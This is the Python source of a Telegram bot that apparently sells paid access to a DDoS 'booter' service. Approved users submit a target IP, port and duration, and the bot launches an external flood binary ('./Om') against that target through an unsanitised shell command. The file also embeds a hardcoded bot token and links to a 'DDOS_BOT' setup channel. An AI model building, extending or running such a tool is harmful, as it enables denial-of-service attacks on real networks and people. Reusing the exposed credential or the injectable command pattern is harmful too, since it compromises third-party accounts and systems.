import os
import telebot
import json
import requests
import logging
import time
from datetime import datetime, timedelta
import asyncio
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
from threading import Thread

loop = asyncio.get_event_loop()

# Keep your original token and other variables
TOKEN = '7010248454:AAF9aCEjE-9I88m8Pq5EDEnEfiOYM8AWrWM'
FORWARD_CHANNEL_ID = -1002363384391
CHANNEL_ID = -1002363384391
error_channel_id = -1002363384391

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

bot = telebot.TeleBot(TOKEN)
REQUEST_INTERVAL = 1

blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

running_processes = []

REMOTE_HOST = '4.213.71.147'  


# User storage in text file 'user.txt'
def load_users():
    users = {}
    try:
        with open("user.txt", "r") as f:
            for line in f:
                user_data = json.loads(line.strip())
                users[user_data["user_id"]] = user_data
    except FileNotFoundError:
        pass
    return users

def save_user(user_data):
    users = load_users()
    users[user_data["user_id"]] = user_data
    with open("user.txt", "w") as f:
        for user in users.values():
            f.write(json.dumps(user) + "\n")

def get_user(user_id):
    users = load_users()
    return users.get(user_id)

def count_users_with_plan(plan):
    users = load_users()
    return sum(1 for user in users.values() if user["plan"] == plan)


# Async attack command logic
async def run_attack_command_on_codespace(target_ip, target_port, duration):
    command = f"./Om {target_ip} {target_port} {duration}"
    try:
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        running_processes.append(process)
        stdout, stderr = await process.communicate()
        output = stdout.decode()
        error = stderr.decode()

        if output:
            logging.info(f"Command output: {output}")
        if error:
            logging.error(f"Command error: {error}")

    except Exception as e:
        logging.error(f"Failed to execute command on Codespace: {e}")
    finally:
        if process in running_processes:
            running_processes.remove(process)


async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)

async def run_attack_command_async(target_ip, target_port, duration):
    await run_attack_command_on_codespace(target_ip, target_port, duration)

def is_user_admin(user_id, chat_id):
    try:
        return bot.get_chat_member(chat_id, user_id).status in ['administrator', 'creator']
    except:
        return False

def check_user_approval(user_id):
    user_data = get_user(user_id)
    if user_data and user_data['plan'] > 0:
        return True
    return False

def send_not_approved_message(chat_id):
    bot.send_message(chat_id, "*☢️FIRST BUY ACCESS FROM YOUR FATHER☢️ @MANAGER_149*", parse_mode='Markdown')


# Approve or disapprove user
@bot.message_handler(commands=['approve', 'disapprove'])
def approve_or_disapprove_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    is_admin = is_user_admin(user_id, CHANNEL_ID)
    cmd_parts = message.text.split()

    if not is_admin:
        bot.send_message(chat_id, "*☢️FIRST BUY ACCESS FROM YOUR FATHER☢️ @MANAGER_149*", parse_mode='Markdown')
        return

    if len(cmd_parts) < 2:
        bot.send_message(chat_id, "*Invalid command format. Use /approve <user_id> <plan> <days> or /disapprove <user_id>.*", parse_mode='Markdown')
        return

    action = cmd_parts[0]
    target_user_id = int(cmd_parts[1])
    plan = int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0
    days = int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0

    if action == '/approve':
        if plan == 1 and count_users_with_plan(1) >= 99:
            bot.send_message(chat_id, "*Approval failed: Instant Plan 🧡 limit reached (99 users).*", parse_mode='Markdown')
            return
        elif plan == 2 and count_users_with_plan(2) >= 499:
            bot.send_message(chat_id, "*Approval failed: Instant++ Plan 💥 limit reached (499 users).*", parse_mode='Markdown')
            return

        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else datetime.now().date().isoformat()
        user_data = {
            "user_id": target_user_id,
            "plan": plan,
            "valid_until": valid_until,
            "access_count": 0
        }
        save_user(user_data)
        msg_text = f"*User {target_user_id} approved with plan {plan} for {days} days.*"
    else:  # disapprove
        user_data = get_user(target_user_id)
        if user_data:
            user_data["plan"] = 0
            user_data["valid_until"] = ""
            user_data["access_count"] = 0
            save_user(user_data)
        msg_text = f"*User {target_user_id} disapproved and reverted to free.*"

    bot.send_message(chat_id, msg_text, parse_mode='Markdown')
    bot.send_message(CHANNEL_ID, msg_text, parse_mode='Markdown')


# Handle attack commands
@bot.message_handler(commands=['Attack'])
def attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if not check_user_approval(user_id):
        send_not_approved_message(chat_id)
        return

    try:
        bot.send_message(chat_id, "*Enter the target IP, port, and duration (in seconds) separated by spaces.*", parse_mode='Markdown')
        bot.register_next_step_handler(message, process_attack_command)
    except Exception as e:
        logging.error(f"Error in attack command: {e}")

def process_attack_command(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "*Invalid command format. Please use: Instant++ plan target_ip target_port duration*", parse_mode='Markdown')
            return
        target_ip, target_port, duration = args[0], int(args[1]), args[2]

        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"*Port {target_port} is blocked. Please use a different port.*", parse_mode='Markdown')
            return

        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
        bot.send_message(message.chat.id, f"*💥Attack started Dear Vip User' 💥\n\nHost: {target_ip}\nPort: {target_port}\nTime: {duration} seconds\nVip User of - @Manager_149*", parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in processing attack command: {e}")

# Start asyncio thread
def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start_asyncio_loop())


# Handle welcome messages
@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
    btn1 = KeyboardButton("Instant Plan 🧡")
    btn2 = KeyboardButton("Instant++ Plan 💥")
    btn3 = KeyboardButton("Canary Download✔️")
    btn4 = KeyboardButton("My Account🏦")
    btn5 = KeyboardButton("Help❓")
    btn6 = KeyboardButton("Contact admin✔️")
    markup.add(btn1, btn2, btn3, btn4, btn5, btn6)
    bot.send_message(message.chat.id, "*Choose an option:*", reply_markup=markup, parse_mode='Markdown')


# Handle other user commands
@bot.message_handler(func=lambda message: True)
def handle_message(message):
    if not check_user_approval(message.from_user.id):
        send_not_approved_message(message.chat.id)
        return

    if message.text == "Instant Plan 🧡":
        bot.reply_to(message, "*Instant Plan selected*", parse_mode='Markdown')
    elif message.text == "Instant++ Plan 💥":
        bot.reply_to(message, "*Instant++ Plan selected*", parse_mode='Markdown')
        attack_command(message)
    elif message.text == "Canary Download✔️":
        bot.send_message(message.chat.id, "*Please use the following link for Canary Download: https://t.me/SETUP_FOR_SHOOTER_DDOS_BOT/2", parse_mode='Markdown')
    elif message.text == "My Account🏦":
        user_id = message.from_user.id
        user_data = get_user(user_id)
        if user_data:
            username = message.from_user.username
            plan = user_data.get('plan', 'N/A')
            valid_until = user_data.get('valid_until', 'N/A')
            current_time = datetime.now().isoformat()
            response = (f"*USERNAME: {username}\n"
                        f"Plan: {plan}\n"
                        f"Valid Until: {valid_until}\n"
                        f"Current Time: {current_time}*")
        else:
            response = "*No account information found. Please contact the administrator.*"
        bot.reply_to(message, response, parse_mode='Markdown')
    elif message.text == "Help❓":
        bot.reply_to(message, "*CONTACT💞@Manager_149💞 FOR HELP*", parse_mode='Markdown')
    elif message.text == "Contact admin✔️":
        bot.reply_to(message, "*🔥@Manager_149💟*", parse_mode='Markdown')


# Start the bot and asyncio thread
if __name__ == "__main__":
    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
    asyncio_thread.start()
    logging.info("Starting Codespace activity keeper and Telegram bot...")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"An error occurred while polling: {e}")
        logging.info(f"Waiting for {REQUEST_INTERVAL} seconds before the next request...")
        time.sleep(REQUEST_INTERVAL)
